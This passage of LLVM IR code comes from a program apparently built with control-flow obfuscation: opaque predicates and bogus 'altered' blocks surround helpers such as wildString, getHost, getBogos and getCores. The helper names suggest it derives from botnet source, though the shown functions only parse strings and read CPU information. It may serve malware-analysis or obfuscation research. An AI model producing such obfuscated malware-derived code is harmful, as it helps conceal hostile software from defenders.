  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %29, label %46, label %72

; <label>:46:                                     ; preds = %originalBBpart24
  %47 = load i32, i32* @x.25
  %48 = load i32, i32* @y.26
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = load i64, i64* %3, align 8
  %56 = shl i64 %55, 4
  %57 = load i8*, i8** %2, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %2, align 8
  %59 = load i8, i8* %57, align 1
  %60 = zext i8 %59 to i64
  %61 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %60
  %62 = load i64, i64* %61, align 8
  %63 = or i64 %56, %62
  store i64 %63, i64* %3, align 8
  %64 = load i32, i32* @x.25
  %65 = load i32, i32* @y.26
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart218, label %originalBB6alteredBB

originalBBpart218:                                ; preds = %originalBB6
  br label %4

; <label>:72:                                     ; preds = %originalBBpart24
  %73 = load i64, i64* %3, align 8
  ret i64 %73

originalBBalteredBB:                              ; preds = %originalBB, %9
  %74 = load i64, i64* %3, align 8
  %75 = icmp sge i64 %74, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %76 = load i64, i64* %3, align 8
  %_ = shl i64 %76, 4
  %77 = shl i64 %76, 4
  %78 = load i8*, i8** %2, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %2, align 8
  %80 = load i8, i8* %78, align 1
  %81 = zext i8 %80 to i64
  %82 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %81
  %83 = load i64, i64* %82, align 8
  %_7 = sub i64 0, %77
  %gen = add i64 %_7, %83
  %_8 = sub i64 0, %77
  %gen9 = add i64 %_8, %83
  %_10 = shl i64 %77, %83
  %_11 = sub i64 0, %77
  %gen12 = add i64 %_11, %83
  %_13 = sub i64 %77, %83
  %gen14 = mul i64 %_13, %83
  %_15 = sub i64 %77, %83
  %gen16 = mul i64 %_15, %83
  %84 = or i64 %77, %83
  store i64 %84, i64* %3, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = load i32, i32* @x.27
  %4 = load i32, i32* @y.28
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %14 = load i8*, i8** %12, align 8
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i32
  %17 = load i32, i32* @x.27
  %18 = load i32, i32* @y.28
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %16, label %86 [
    i32 0, label %25
    i32 42, label %29
    i32 63, label %69
  ]

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i8*, i8** %13, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  store i32 %28, i32* %11, align 4
  br label %124

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i8*, i8** %12, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 1
  %32 = load i8*, i8** %13, align 8
  %33 = call i32 @wildString(i8* %31, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %65

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %13, align 8
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %35
  %41 = load i8*, i8** %12, align 8
  %42 = load i8*, i8** %13, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = call i32 @wildString(i8* %41, i8* %43)
  %45 = icmp ne i32 %44, 0
  %46 = xor i1 %45, true
  br label %47

; <label>:47:                                     ; preds = %40, %35
  %48 = phi i1 [ false, %35 ], [ %46, %40 ]
  %49 = load i32, i32* @x.27
  %50 = load i32, i32* @y.28
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %57 = load i32, i32* @x.27
  %58 = load i32, i32* @y.28
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24, %29
  %66 = phi i1 [ true, %29 ], [ %48, %originalBBpart24 ]
  %67 = xor i1 %66, true
  %68 = zext i1 %67 to i32
  store i32 %68, i32* %11, align 4
  br label %124

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i8*, i8** %13, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %69
  %75 = load i8*, i8** %12, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8*, i8** %13, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = call i32 @wildString(i8* %76, i8* %78)
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br label %82

; <label>:82:                                     ; preds = %74, %69
  %83 = phi i1 [ false, %69 ], [ %81, %74 ]
  %84 = xor i1 %83, true
  %85 = zext i1 %84 to i32
  store i32 %85, i32* %11, align 4
  br label %124

; <label>:86:                                     ; preds = %originalBBpart2
  %87 = load i8*, i8** %12, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = call i32 @toupper(i32 %89) #10
  %91 = load i8*, i8** %13, align 8
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = call i32 @toupper(i32 %93) #10
  %95 = icmp eq i32 %90, %94
  br i1 %95, label %96, label %120

; <label>:96:                                     ; preds = %86
  %97 = load i32, i32* @x.27
  %98 = load i32, i32* @y.28
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i8*, i8** %12, align 8
  %106 = getelementptr inbounds i8, i8* %105, i64 1
  %107 = load i8*, i8** %13, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i32 @wildString(i8* %106, i8* %108)
  %110 = icmp ne i32 %109, 0
  %111 = xor i1 %110, true
  %112 = load i32, i32* @x.27
  %113 = load i32, i32* @y.28
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %120

; <label>:120:                                    ; preds = %originalBBpart214, %86
  %121 = phi i1 [ false, %86 ], [ %111, %originalBBpart214 ]
  %122 = xor i1 %121, true
  %123 = zext i1 %122 to i32
  store i32 %123, i32* %11, align 4
  br label %124

; <label>:124:                                    ; preds = %120, %82, %65, %25
  %125 = load i32, i32* %11, align 4
  ret i32 %125

originalBBalteredBB:                              ; preds = %originalBB, %2
  %126 = alloca i32, align 4
  %127 = alloca i8*, align 8
  %128 = alloca i8*, align 8
  store i8* %0, i8** %127, align 8
  store i8* %1, i8** %128, align 8
  %129 = load i8*, i8** %127, align 8
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %132 = load i8*, i8** %12, align 8
  %133 = getelementptr inbounds i8, i8* %132, i64 1
  %134 = load i8*, i8** %13, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = call i32 @wildString(i8* %133, i8* %135)
  %137 = icmp ne i32 %136, 0
  %_ = sub i1 false, %137
  %gen = add i1 %_, true
  %_7 = sub i1 %137, true
  %gen8 = mul i1 %_7, true
  %_9 = sub i1 %137, true
  %gen10 = mul i1 %_9, true
  %_11 = sub i1 false, %137
  %gen12 = add i1 %_11, true
  %138 = xor i1 %137, true
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %23, %1
  %4 = load i32, i32* @x.31
  %5 = load i32, i32* @y.32
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = load i8*, i8** %2, align 8
  %13 = load i8, i8* %12, align 1
  %14 = icmp ne i8 %13, 0
  %15 = load i32, i32* @x.31
  %16 = load i32, i32* @y.32
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %32

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i8*, i8** %2, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = call i32 @toupper(i32 %26) #10
  %28 = trunc i32 %27 to i8
  %29 = load i8*, i8** %2, align 8
  store i8 %28, i8* %29, align 1
  %30 = load i8*, i8** %2, align 8
  %31 = getelementptr inbounds i8, i8* %30, i32 1
  store i8* %31, i8** %2, align 8
  br label %3

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.31
  %34 = load i32, i32* @y.32
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @x.31
  %42 = load i32, i32* @y.32
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %49 = load i8*, i8** %2, align 8
  %50 = load i8, i8* %49, align 1
  %51 = icmp ne i8 %50, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %194, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %196

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %194

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %originalBBpart216, %19
  %23 = load i32, i32* @x.33
  %24 = load i32, i32* @y.34
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 32
  %35 = load i32, i32* @x.33
  %36 = load i32, i32* @y.34
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %85, label %43

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.33
  %45 = load i32, i32* @y.34
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i8*, i8** %6, align 8
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 9
  %56 = load i32, i32* @x.33
  %57 = load i32, i32* @y.34
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %55, label %85, label %64

; <label>:64:                                     ; preds = %originalBBpart24
  %65 = load i32, i32* @x.33
  %66 = load i32, i32* @y.34
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 58
  %77 = load i32, i32* @x.33
  %78 = load i32, i32* @y.34
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %originalBBpart24, %originalBBpart2
  %86 = phi i1 [ true, %originalBBpart24 ], [ true, %originalBBpart2 ], [ %76, %originalBBpart28 ]
  %87 = load i32, i32* @x.33
  %88 = load i32, i32* @y.34
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %85
  %95 = load i32, i32* @x.33
  %96 = load i32, i32* @y.34
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %86, label %103, label %122

; <label>:103:                                    ; preds = %originalBBpart212
  %104 = load i32, i32* @x.33
  %105 = load i32, i32* @y.34
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %103
  %112 = load i8*, i8** %6, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %6, align 8
  %114 = load i32, i32* @x.33
  %115 = load i32, i32* @y.34
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %22

; <label>:122:                                    ; preds = %originalBBpart212
  br label %123

; <label>:123:                                    ; preds = %originalBBpart234, %122
  %124 = load i32, i32* @x.33
  %125 = load i32, i32* @y.34
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %123
  %132 = load i8*, i8** %6, align 8
  %133 = load i8*, i8** %6, align 8
  %134 = call i64 @strlen(i8* %133) #10
  %135 = sub i64 %134, 1
  %136 = getelementptr inbounds i8, i8* %132, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 13
  %140 = load i32, i32* @x.33
  %141 = load i32, i32* @y.34
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %139, label %157, label %148

; <label>:148:                                    ; preds = %originalBBpart220
  %149 = load i8*, i8** %6, align 8
  %150 = load i8*, i8** %6, align 8
  %151 = call i64 @strlen(i8* %150) #10
  %152 = sub i64 %151, 1
  %153 = getelementptr inbounds i8, i8* %149, i64 %152
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 10
  br label %157

; <label>:157:                                    ; preds = %148, %originalBBpart220
  %158 = phi i1 [ true, %originalBBpart220 ], [ %156, %148 ]
  br i1 %158, label %159, label %181

; <label>:159:                                    ; preds = %157
  %160 = load i32, i32* @x.33
  %161 = load i32, i32* @y.34
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %159
  %168 = load i8*, i8** %6, align 8
  %169 = load i8*, i8** %6, align 8
  %170 = call i64 @strlen(i8* %169) #10
  %171 = sub i64 %170, 1
  %172 = getelementptr inbounds i8, i8* %168, i64 %171
  store i8 0, i8* %172, align 1
  %173 = load i32, i32* @x.33
  %174 = load i32, i32* @y.34
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart234, label %originalBB22alteredBB

originalBBpart234:                                ; preds = %originalBB22
  br label %123

; <label>:181:                                    ; preds = %157
  %182 = load i8*, i8** %6, align 8
  %183 = call i8* @strchr(i8* %182, i32 46) #10
  %184 = icmp ne i8* %183, null
  br i1 %184, label %185, label %188

; <label>:185:                                    ; preds = %181
  %186 = load i8*, i8** %6, align 8
  %187 = call i8* @strchr(i8* %186, i32 46) #10
  store i8 0, i8* %187, align 1
  br label %188

; <label>:188:                                    ; preds = %185, %181
  %189 = load i8*, i8** %3, align 8
  %190 = load i8*, i8** %6, align 8
  %191 = call i8* @strcpy(i8* %189, i8* %190) #2
  %192 = load i32, i32* %4, align 4
  %193 = call i32 @close(i32 %192)
  store i32 0, i32* %2, align 4
  br label %215

; <label>:194:                                    ; preds = %13
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %195, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:196:                                    ; preds = %8
  %197 = load i32, i32* @x.33
  %198 = load i32, i32* @y.34
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %196
  %205 = load i32, i32* %4, align 4
  %206 = call i32 @close(i32 %205)
  store i32 1, i32* %2, align 4
  %207 = load i32, i32* @x.33
  %208 = load i32, i32* @y.34
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %215

; <label>:215:                                    ; preds = %originalBBpart238, %188
  %216 = load i32, i32* @x.33
  %217 = load i32, i32* @y.34
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %215
  %224 = load i32, i32* %2, align 4
  %225 = load i32, i32* @x.33
  %226 = load i32, i32* @y.34
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  ret i32 %224

originalBBalteredBB:                              ; preds = %originalBB, %22
  %233 = load i8*, i8** %6, align 8
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %237 = load i8*, i8** %6, align 8
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 9
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %241 = load i8*, i8** %6, align 8
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 58
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %85
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %103
  %245 = load i8*, i8** %6, align 8
  %246 = getelementptr inbounds i8, i8* %245, i32 1
  store i8* %246, i8** %6, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %123
  %247 = load i8*, i8** %6, align 8
  %248 = load i8*, i8** %6, align 8
  %249 = call i64 @strlen(i8* %248) #10
  %_ = shl i64 %249, 1
  %250 = sub i64 %249, 1
  %251 = getelementptr inbounds i8, i8* %247, i64 %250
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 13
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %159
  %255 = load i8*, i8** %6, align 8
  %256 = load i8*, i8** %6, align 8
  %257 = call i64 @strlen(i8* %256) #10
  %_23 = shl i64 %257, 1
  %_24 = sub i64 0, %257
  %gen = add i64 %_24, 1
  %_25 = shl i64 %257, 1
  %_26 = sub i64 %257, 1
  %gen27 = mul i64 %_26, 1
  %_28 = shl i64 %257, 1
  %_29 = sub i64 %257, 1
  %gen30 = mul i64 %_29, 1
  %_31 = sub i64 %257, 1
  %gen32 = mul i64 %_31, 1
  %258 = sub i64 %257, 1
  %259 = getelementptr inbounds i8, i8* %255, i64 %258
  store i8 0, i8* %259, align 1
  br label %originalBB22

originalBB36alteredBB:                            ; preds = %originalBB36, %196
  %260 = load i32, i32* %4, align 4
  %261 = call i32 @close(i32 %260)
  store i32 1, i32* %2, align 4
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %215
  %262 = load i32, i32* %2, align 4
  br label %originalBB40
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %51, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %53

; <label>:10:                                     ; preds = %5
  %11 = load i32, i32* @x.35
  %12 = load i32, i32* @y.36
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %19)
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %21 = call i8* @strstr(i8* %20, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
